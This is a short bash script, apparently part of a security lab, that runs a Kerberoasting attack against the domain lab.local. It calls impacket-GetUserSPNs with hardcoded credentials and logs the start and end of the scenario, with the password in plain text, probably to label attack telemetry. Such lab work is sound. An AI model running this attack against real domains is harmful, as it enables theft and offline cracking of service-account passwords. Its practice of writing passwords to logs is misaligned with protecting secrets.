#!/bin/bash

set -euo pipefail

DOMAIN="lab.local"
DC_IP="10.99.10.10"
USER="user3"
PASSWORD="!!11SilvAga"
SCENARIO_ID="${1:-kerberoast}"
LOG_FILE="scenario.log"

START_TIME="$(date -Is)"
echo "${START_TIME},scenario=${SCENARIO_ID},type=kerberoasting,status=start,domain=${DOMAIN},user=${USER},password=${PASSWORD},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${START_TIME}: Sākts Kerberoasting scenārijs ${SCENARIO_ID}"
echo "[*] Domēns: ${DOMAIN} Lietotājs: ${USER} Parole: ${PASSWORD} DC: ${DC_IP}"

impacket-GetUserSPNs ${DOMAIN}/${USER}:"${PASSWORD}" -dc-ip ${DC_IP} -request

END_TIME="$(date -Is)"
echo "${END_TIME},scenario=${SCENARIO_ID},type=kerberoasting,status=end,domain=${DOMAIN},user=${USER},password=${PASSWORD},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${END_TIME}: Pabeigts scenārijs ${SCENARIO_ID}"

